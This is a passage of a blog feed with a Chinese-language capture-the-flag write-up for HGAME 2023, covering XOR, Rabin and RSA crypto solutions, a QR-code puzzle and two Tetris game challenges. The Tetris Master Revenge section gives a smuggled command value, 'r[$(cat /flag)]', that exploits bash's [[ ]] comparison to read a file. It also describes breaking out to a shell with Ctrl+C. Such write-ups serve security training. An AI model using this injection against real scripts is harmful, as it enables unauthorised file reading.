python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">key = [</span><br><span class="line">  <span class="number">0x4E</span>, <span class="number">0xA0</span>, <span class="number">0x37</span>, <span class="number">0x40</span>, <span class="number">0x46</span>, <span class="number">0x02</span>, <span class="number">0xDA</span>, <span class="number">0xFD</span>, <span class="number">0x21</span>, <span class="number">0xFA</span>, </span><br><span class="line">  <span class="number">0x6E</span>, <span class="number">0x3C</span>, <span class="number">0xAF</span>, <span class="number">0xD9</span>, <span class="number">0x9C</span>, <span class="number">0xCF</span>, <span class="number">0xB9</span>, <span class="number">0x47</span>, <span class="number">0x33</span>, <span class="number">0x67</span>, </span><br><span class="line">  <span class="number">0xE0</span>, <span class="number">0x4E</span>, <span class="number">0xEC</span>, <span class="number">0x0D</span>, <span class="number">0xD1</span>, <span class="number">0xC4</span>, <span class="number">0x80</span>, <span class="number">0x13</span>, <span class="number">0x32</span>, <span class="number">0xA9</span>, </span><br><span class="line">  <span class="number">0xB2</span>, <span class="number">0x3A</span>, <span class="number">0xA7</span>, <span class="number">0x50</span>, <span class="number">0x5D</span>, <span class="number">0x02</span>, <span class="number">0x82</span>, <span class="number">0x39</span>, <span class="number">0x4A</span>, <span class="number">0x83</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c = [</span><br><span class="line">  <span class="number">0x28</span>, <span class="number">0x50</span>, <span class="number">0xC1</span>, <span class="number">0x23</span>, <span class="number">0x98</span>, <span class="number">0xA1</span>, <span class="number">0x41</span>, <span class="number">0x36</span>, <span class="number">0x4C</span>, <span class="number">0x31</span>, </span><br><span class="line">  <span class="number">0xCB</span>, <span class="number">0x52</span>, <span class="number">0x90</span>, <span class="number">0xF1</span>, <span class="number">0xAC</span>, <span class="number">0xCC</span>, <span class="number">0x0F</span>, <span class="number">0x6C</span>, <span class="number">0x2A</span>, <span class="number">0x89</span>, </span><br><span class="line">  <span class="number">0x7F</span>, <span class="number">0xDF</span>, <span class="number">0x11</span>, <span class="number">0x84</span>, <span class="number">0x7F</span>, <span class="number">0xE6</span>, <span class="number">0xA2</span>, <span class="number">0xE0</span>, <span class="number">0x59</span>, <span class="number">0xC7</span>, </span><br><span class="line">  <span class="number">0xC5</span>, <span class="number">0x46</span>, <span class="number">0x5D</span>, <span class="number">0x29</span>, <span class="number">0x38</span>, <span class="number">0x93</span>, <span class="number">0xED</span>, <span class="number">0x15</span>, <span class="number">0x7A</span>, <span class="number">0xFF</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(c),<span class="number">4</span>):</span><br><span class="line">    flag += <span class="built_in">chr</span>(c[i]^key[i+<span class="number">3</span>]) + <span class="built_in">chr</span>(c[i+<span class="number">1</span>]^key[i+<span class="number">2</span>]) + <span class="built_in">chr</span>(c[i+<span class="number">2</span>]^key[i+<span class="number">1</span>]) + <span class="built_in">chr</span>(c[i+<span class="number">3</span>]^key[i])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># hgame&#123;Cpp_1s_much_m0r3_dlff1cult_th4n_C&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;â€‹    &lt;/p&gt;
&lt;p&gt;HGAME 2023 å°†äº 1 æœˆ 5 æ—¥ 20:00 æ­£å¼å¼€å§‹ï¼Œç¥å¤§å®¶ç©å¾—å¼€å¿ƒ :-)&lt;br&gt;çº¿ä¸Šèµ›å¹³å°ï¼š&lt;a href=&quot;https://hgame.vidar.club/&quot;&gt;https://hgame.vidar.club&lt;/a&gt;&lt;br&gt;è¯·å°½</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2023èµ›" scheme="https://lazzzaro.github.io/tags/2023%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>HGAME 2023 Week 2</title>
    <link href="https://lazzzaro.github.io/2023/01/20/match-HGAME-2023-Week-2/"/>
    <id>https://lazzzaro.github.io/2023/01/20/match-HGAME-2023-Week-2/</id>
    <published>2023-01-20T09:25:16.000Z</published>
    <updated>2023-01-20T11:58:46.830Z</updated>
    
    <content type="html"><![CDATA[<p>â€‹    </p><p>HGAME 2023 å°†äº 1 æœˆ 5 æ—¥ 20:00 æ­£å¼å¼€å§‹ï¼Œç¥å¤§å®¶ç©å¾—å¼€å¿ƒ :-)<br>çº¿ä¸Šèµ›å¹³å°ï¼š<a href="https://hgame.vidar.club/">https://hgame.vidar.club</a><br>è¯·å°½å¿«æ³¨å†Œï¼Œæ³¨å†Œæ—¶è¯·é€‰æ‹©æ ¡å¤–é€‰æ‰‹ï¼Œæ³¨å†Œå°†äº 1 æœˆ 12 æ—¥ 20:00 å…³é—­<br>æœ¬æ¬¡æ¯”èµ›çš„å¥–åŠ±äº‹å®œä»¥åŠèµ›åæ²Ÿé€šåé¦ˆä»¥é‚®ä»¶ä¸ºä¸»ï¼Œè¯·å„ä½ä½¿ç”¨çœŸå®çš„é‚®ä»¶åœ°å€<br>æ¯”èµ›å¥–é‡‘(é’ˆå¯¹æ ¡å¤–æ¦œ)ï¼š<br>ç¬¬1åï¼š1000Pwnhubé‡‘å¸<br>ç¬¬2åï¼š800Pwnhubé‡‘å¸<br>ç¬¬3åï¼š600Pwnhubé‡‘å¸<br>4-10åï¼š300Pwnhubé‡‘å¸<br>è¡¥å……è¯´æ˜ï¼šæ’è¡Œæ¦œåˆ†æ•°ç›¸åŒè€…ï¼Œä»¥å…ˆè¾¾åˆ°è¯¥åˆ†æ•°çš„æ—¶é—´æ¬¡åºåˆ’å®šæ’åï¼Œæ¯ä½è·å¥–é€‰æ‰‹é¢å¤–èµ é€ Pwnhub é‚€è¯·ç ä¸€ä¸ª<br>æ³¨æ„ï¼š<br>* æ‰€æœ‰é€‰æ‰‹å‡ä»¥ä¸ªäººä¸ºå•ä½å‚èµ›ï¼›<br>* åœ¨è§£é¢˜è¿‡ç¨‹ä¸­é‡åˆ°ç“¶é¢ˆæˆ–å›°éš¾å¯ä»¥ç§èŠå‡ºé¢˜äºº<br>* ç¦æ­¢æ‰€æœ‰ç ´åæ¯”èµ›å…¬å¹³å…¬æ­£çš„è¡Œä¸ºï¼Œå¦‚ï¼šæ•£æ’­æˆ–ä¸å…¶ä»–äººäº¤æ¢ Flagã€è§£é¢˜æ€è·¯ï¼Œå¯¹å¹³å°ã€å‚èµ›è€…æˆ–å…¶ä»–äººå‘˜è¿›è¡Œæ”»å‡»ã€‚è¿è€…åˆ†æ•°ä½œåºŸå¹¶å–æ¶ˆæ¯”èµ›èµ„æ ¼ã€‚<br>* HGAME çº¿ä¸Šèµ›åˆ†ä¸ºå››å‘¨ï¼Œæ¯å‘¨è‡³å®˜æ–¹wpå‘å¸ƒå‰å‰ç¦æ­¢ä¸€åˆ‡è®¨è®ºæœ¬å‘¨é¢˜ç›®ä»¥åŠå…¬å¼€è‡ªå·± wp çš„è¡Œä¸ºã€‚åœ¨æ”¶é›†å®Œæˆåä¼šå¼€æ”¾è®¨è®ºï¼Œä½†ä»…èƒ½è®¨è®ºå·²ç»“æŸçš„é¢˜ç›®ã€‚<br>* æ¯å‘¨æ¯”èµ›ç»“æŸåæœ¬å‘¨å‰20åéœ€æäº¤wpåˆ°æŒ‡å®šé‚®ç®±<br>æœ¬æ¯”èµ›æœ€ç»ˆè§£é‡Šæƒå½’ Vidar-Team æ‰€æœ‰</p><p><strong>Rank: 8</strong></p><hr><p>â€‹    </p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Tetris-Master"><a href="#Tetris-Master" class="headerlink" title="Tetris Master"></a>Tetris Master</h3><blockquote><p>ä½ æ˜¯å¦å·²ç»åŒå€¦äº†æ™®é€šçš„æ¸¸æˆé¢˜ç›®ï¼Œå¯¹äºå†™è„šæœ¬ç©æ¸¸æˆæ„Ÿåˆ°æ— èŠï¼Ÿ æ­¤é¢˜ä½ éœ€è¦èƒ½å¤Ÿå®ç°RCEï¼Œæ‹¿åˆ°æ ¹ç›®å½•ä¸‹çš„flagï¼Œåˆæˆ–è€…ä½ æ˜¯çœŸæ­£çš„Tetris Masterï¼Ÿ </p><p>è¯·ä½¿ç”¨sshè¿›è¡Œè¿æ¥ï¼Œè´¦å·ä¸ºctf,å¯†ç ä¸ºhgameï¼Œä¾‹å¦‚ssh ctf@week-2.hgame.lwsec.cn -p portã€‚å¹¶ä¸”ä½ éœ€è¦å°†ç»ˆç«¯çš„å­—ä½“è°ƒå°ï¼Œä½¿çª—å£å¤§å°è‡³å°‘ä¸º 200 * 70 æ‰èƒ½æ­£å¸¸è¿›è¡Œæ¸¸æˆã€‚</p><p>HINTS:</p><p>é¢˜ç›®æè¿°å·²æ›´æ–°ï¼ŒåŒæ—¶ç”±äºå­˜åœ¨éé¢„æœŸï¼Œé¢˜ç›®åˆ†æ•°é™è‡³50,å¹¶ä¸Šçº¿100åˆ†çš„Revengeç‰ˆæœ¬ã€‚</p></blockquote><p>è¿æ¥ï¼š<code>ssh ctf@week-2.hgame.lwsec.cn -p 32150</code></p><p>æŒ‰ Ctrl+C å¼ºåˆ¶ç»“æŸæ‹¿åˆ°shellï¼Œ<code>cat flag</code> å¾—flagï¼š<code>hgame&#123;Bash_Game^Also*Can#Rce&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="Tetris-Master-Revenge"><a href="#Tetris-Master-Revenge" class="headerlink" title="Tetris Master Revenge"></a>Tetris Master Revenge</h3><blockquote><p>the same as Tetris Master</p></blockquote><p>bashå‘½ä»¤æ‰§è¡Œï¼Œå‚è€ƒByteCTF 2022 - bash_gameï¼Œåœ¨è¯»å…¥ <code>target</code> å€¼è¿›å…¥ <code>paint_game_over()</code> å†…ï¼Œæ¯”è¾ƒæ—¶ <code>[[]]</code> æ“ä½œç¬¦ä¼šé€ æˆRCEã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">paint_game_over</span></span>() &#123;</span><br><span class="line">    <span class="built_in">local</span> xcent=$((`tput lines`/<span class="number">2</span>)) ycent=$((`tput cols`/<span class="number">2</span>))</span><br><span class="line">    <span class="built_in">local</span> x=$((xcent-<span class="number">4</span>)) y=$((ycent-<span class="number">25</span>))</span><br><span class="line">    <span class="keyword">for</span> (( i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ )); <span class="keyword">do</span></span><br><span class="line">        <span class="built_in">echo</span> -ne <span class="string">&quot;\033[<span class="subst">$((x+i)</span>);<span class="variable">$&#123;y&#125;</span>H\033[44m<span class="variable">$&#123;good_game[$i]&#125;</span>\033[0m&quot;</span>;</span><br><span class="line">    <span class="keyword">done</span></span><br><span class="line">    <span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$master</span>&quot;</span> -eq <span class="string">&quot;y&quot;</span> ]] &amp;&amp; [[ <span class="string">&quot;<span class="variable">$score</span>&quot;</span> -gt 50000 ]]; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> -ne <span class="string">&quot;\033[<span class="subst">$((x+3)</span>);<span class="subst">$((ycent+1)</span>)H\033[44m`cat /flag`\033[0m&quot;</span>;</span><br><span class="line">    <span class="keyword">elif</span> [[ <span class="string">&quot;<span class="variable">$master</span>&quot;</span> -ne <span class="string">&quot;y&quot;</span> ]] &amp;&amp; [[ <span class="string">&quot;<span class="variable">$score</span>&quot;</span> -gt <span class="string">&quot;<span class="variable">$target</span>&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> -ne <span class="string">&quot;\033[<span class="subst">$((x+3)</span>);;<span class="subst">$((ycent+1)</span>)H\033[44mKeep Going\033[0m&quot;</span></span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">        <span class="built_in">echo</span> -ne <span class="string">&quot;\033[<span class="subst">$((x+3)</span>);<span class="subst">$((ycent+1)</span>)H\033[44m<span class="variable">$&#123;score&#125;</span>\033[0m&quot;</span>;</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>sshè¿æ¥ï¼Œé€‰æ‹© <code>n</code>ï¼Œè¾“å…¥ç›®æ ‡åˆ†æ•° <code>r[$(cat /flag)]</code>ï¼Œç¡®è®¤è¿›å…¥æ¸¸æˆï¼Œå¿«é€Ÿç»“æŸä¸€å±€ååœ¨ç»“æœå¤„ä»¥æŠ¥é”™å½¢å¼è¾“å‡ºflagï¼š<code>hgame&#123;Bash_Game^Also*Can#Rce^reVenge!!!!&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="Sign-In-Pro-Max"><a href="#Sign-In-Pro-Max" class="headerlink" title="Sign In Pro Max"></a>Sign In Pro Max</h3><blockquote><p>å…”å…”æ²¡æœ‰æŠ¢åˆ°å›å®¶çš„è½¦ç¥¨ï¼Œä¸€ä¸ªçŒ«çŒ«å¤´åƒçš„å­¦é•¿ç»™äº†ä»–ä¸€ä¸ªå€™è¡¥è½¦ç¥¨æŠ¢ç¥¨è½¯ä»¶ï¼Œä½†æ˜¯è¿™ä¸ªè½¯ä»¶çš„éªŒè¯ç å¤ªéš¾äº†ï¼Œä½ èƒ½å¸®ä»–è§£ä¸€ä¸‹å—ï¼Ÿ flag è‹±æ–‡å­—æ¯ä¸ºå…¨å°å†™ï¼Œè‡ªè¡Œä½¿ç”¨ hgame{}åŒ…è£¹åæäº¤</p></blockquote><p>äº”ä¸ªéƒ¨åˆ†ï¼š</p><p>Part1ï¼šbase64+base58+base32ï¼Œå¾—åˆ° <code>f51d3a18</code>ï¼›</p><p>Part2ï¼šmd5ï¼Œå¾—åˆ° <code>f91c</code>ï¼›</p><p>Part3ï¼šsha1ï¼Œå¾—åˆ° <code>4952</code>ï¼›</p><p>Part4ï¼šsha256ï¼Œå¾—åˆ° <code>a3ed</code>ï¼›</p><p>Part5ï¼šrot21ï¼Œå¾—åˆ° <code>Part5 is 0bc0ea61d21c, now put all the parts together, don&#39;t forget the format.</code></p><p>æŒ‰UUIDæ ¼å¼è¿æ¥å¾—flagï¼š <code>hgame&#123;f51d3a18-f91c-4952-a3ed-0bc0ea61d21c&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="crazy-qrcode"><a href="#crazy-qrcode" class="headerlink" title="crazy_qrcode"></a>crazy_qrcode</h3><blockquote><p>å…”å…”åœ¨ä¹°å¹´è´§,ä½†æ˜¯çœ‹ç€å•†å®¶çš„ä»˜æ¬¾äºŒç»´ç çŠ¯äº†éš¾</p></blockquote><p>pngå›¾ç‰‡çš„äºŒç»´ç æ— æ³•æ‰«æï¼Œä½¿ç”¨<a href="https://merricx.github.io/qrazybox/">QRazyBox</a>å¯¼å…¥ï¼Œåˆ©ç”¨è‡ªå¸¦å·¥å…· Brute-force Format Info Pattern å¯ä»¥å¾—åˆ°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Decoded Message :</span><br><span class="line">QDjkXkpM0BHNXujs</span><br><span class="line">Error Correction Level : H</span><br><span class="line">Mask Pattern : 4</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>QDjkXkpM0BHNXujs</code> è§£å‹zipå‹ç¼©åŒ…ï¼Œå¾—åˆ°25å¼ åˆ†å‰²çš„äºŒç»´ç å›¾ç‰‡ï¼Œä»¥åŠä¸€ä¸ª25é•¿åº¦çš„æ•°ç»„ã€‚</p><p>1ä¸º90Â°æ—‹è½¬ï¼Œ2ä¸º180Â°æ—‹è½¬ï¼Œ3ä¸º270Â°æ—‹è½¬ï¼Œ0ä¸ºä¸æ—‹è½¬ï¼Œ?ä¸ºéœ€é€‰æ‹©å…¶ä¸­ä¸€ä¸ªå€¼è°ƒæ•´ã€‚</p><p>æŒ‰ç…§5Ã—5æ‹¼æ¥å¥½åæ‰«æå¾—åˆ°flagï¼š<code>hgame&#123;Cr42y_qrc0de&#125;</code>ã€‚</p><p>â€‹    </p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Rabin"><a href="#Rabin" class="headerlink" title="Rabin"></a>Rabin</h3><blockquote><p>çœ‹èµ·æ¥éå¸¸åƒRSAå‘¢ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_key</span>(<span class="params">kbits</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        p = getPrime(kbits)</span><br><span class="line">        q = getPrime(kbits)</span><br><span class="line">        <span class="keyword">if</span> p % <span class="number">4</span> == <span class="number">3</span> <span class="keyword">and</span> q % <span class="number">4</span>== <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> p, q</span><br><span class="line"></span><br><span class="line">p ,q = gen_key(<span class="number">256</span>)</span><br><span class="line">   flag =  <span class="built_in">open</span>(<span class="string">&quot;flag&quot;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">   pt = bytes_to_long(flag)</span><br><span class="line">   c = <span class="built_in">pow</span>(pt, <span class="number">2</span>, p*q)</span><br><span class="line">   </span><br><span class="line">   <span class="built_in">print</span>(<span class="string">f&quot;p=<span class="subst">&#123;p&#125;</span>\nq=<span class="subst">&#123;q&#125;</span>&quot;</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">f&quot;c=<span class="subst">&#123;<span class="built_in">hex</span>(c)[<span class="number">2</span>:]&#125;</span>&quot;</span>)</span><br><span class="line">   </span><br><span class="line">   <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">p=65428327184555679690730137432886407240184329534772421373193521144693375074983</span></span><br><span class="line"><span class="string">q=98570810268705084987524975482323456006480531917292601799256241458681800554123</span></span><br><span class="line"><span class="string">   c=4e072f435cbffbd3520a283b3944ac988b98fb19e723d1bd02ad7e58d9f01b26d622edea5ee538b2f603d5bf785b0427de27ad5c76c656dbd9435d3a4a7cf556</span></span><br><span class="line"><span class="string">   &quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></blockquote><p>$e=2$ï¼ŒRabinç®—æ³•è§£RSAã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rabin_decrypt</span>(<span class="params">c, p, q, e=<span class="number">2</span></span>):</span><br><span class="line">n = p * q</span><br><span class="line">mp = <span class="built_in">pow</span>(c, (p + <span class="number">1</span>) // <span class="number">4</span>, p)</span><br><span class="line">mq = <span class="built_in">pow</span>(c, (q + <span class="number">1</span>) // <span class="number">4</span>, q)</span><br><span class="line">yp = gmpy2.invert(p, q)</span><br><span class="line">yq = gmpy2.invert(q, p)</span><br><span class="line">r = (yp * p * mq + yq * q * mp) % n</span><br><span class="line">rr = n - r</span><br><span class="line">s = (yp * p * mq - yq * q * mp) % n</span><br><span class="line">ss = n - s</span><br><span class="line"><span class="keyword">return</span> (r, rr, s, ss)</span><br><span class="line"> </span><br><span class="line">p = <span class="number">65428327184555679690730137432886407240184329534772421373193521144693375074983</span></span><br><span class="line">q = <span class="number">98570810268705084987524975482323456006480531917292601799256241458681800554123</span></span><br><span class="line">c = <span class="number">0x4e072f435cbffbd3520a283b3944ac988b98fb19e723d1bd02ad7e58d9f01b26d622edea5ee538b2f603d5bf785b0427de27ad5c76c656dbd9435d3a4a7cf556</span></span><br><span class="line">m = rabin_decrypt(c,p,q)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m[i])[<span class="number">2</span>:]))</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># b&#x27;hgame&#123;That&#x27;5_s0_3asy_to_s@lve_r@bin&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="RSA-å¤§å†’é™©1"><a href="#RSA-å¤§å†’é™©1" class="headerlink" title="RSA å¤§å†’é™©1"></a>RSA å¤§å†’é™©1</h3><blockquote><p>é©¬ä¸Šè¦è¿‡å¹´å–½ï¼Œå…”å…”å¼€å¿ƒåœ°å»è¶…å¸‚ä¹°å¹´è´§ï¼Œä½†æ˜¯è¶…å¸‚é—¨å£å´å†™ç€â€åªæœ‰å®ŒæˆæŒ‘æˆ˜æ‰èƒ½è¿›å…¥è¶…å¸‚â€ï¼Œä½ èƒ½å¸®å¸®å…”å…”å—</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># challenge1.py</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> challenges <span class="keyword">import</span> chall1_secret</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RSAServe</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        self.e = <span class="number">65537</span></span><br><span class="line">        self.p = getPrime(<span class="number">128</span>)</span><br><span class="line">        self.q = getPrime(<span class="number">100</span>)</span><br><span class="line">        self.r = getPrime(<span class="number">100</span>)</span><br><span class="line">        self.m = chall1_secret</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">self</span>):</span><br><span class="line">        m_ = bytes_to_long(self.m)</span><br><span class="line">        c = <span class="built_in">pow</span>(m_, self.e, self.p*self.q*self.r)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">hex</span>(c)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, msg</span>):</span><br><span class="line">        <span class="keyword">return</span> msg == self.m</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">pubkey</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.p*self.q*self.r, self.e, self.p</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># challenge2.py</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> challenges <span class="keyword">import</span> chall2_secret</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RSAServe</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        self.p = getPrime(<span class="number">512</span>)</span><br><span class="line">        self.q = getPrime(<span class="number">512</span>)</span><br><span class="line">        self.e = <span class="number">65537</span></span><br><span class="line">        self.m = chall2_secret</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">self</span>):</span><br><span class="line">        m_ = bytes_to_long(self.m)</span><br><span class="line">        c = <span class="built_in">pow</span>(m_ ,self.e, self.p*self.q)</span><br><span class="line">        self.q = getPrime(<span class="number">512</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">hex</span>(c)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, msg</span>):</span><br><span class="line">        <span class="keyword">return</span> msg == self.m</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">pubkey</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.p*self.q, self.e</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># challenge3.py</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> challenges <span class="keyword">import</span> chall3_secret</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RSAServe</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        self.p = getPrime(<span class="number">512</span>)</span><br><span class="line">        self.q = getPrime(<span class="number">512</span>)</span><br><span class="line">        self.e = <span class="number">3</span></span><br><span class="line">        self.m = chall3_secret</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">self</span>):</span><br><span class="line">        m_ = bytes_to_long(self.m)</span><br><span class="line">        c = <span class="built_in">pow</span>(m_, self.e, self.p*self.q)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">hex</span>(c)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, msg</span>):</span><br><span class="line">        <span class="keyword">return</span> msg == self.m</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">pubkey</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.p*self.q, self.e</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># challenge4.py</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> challenges <span 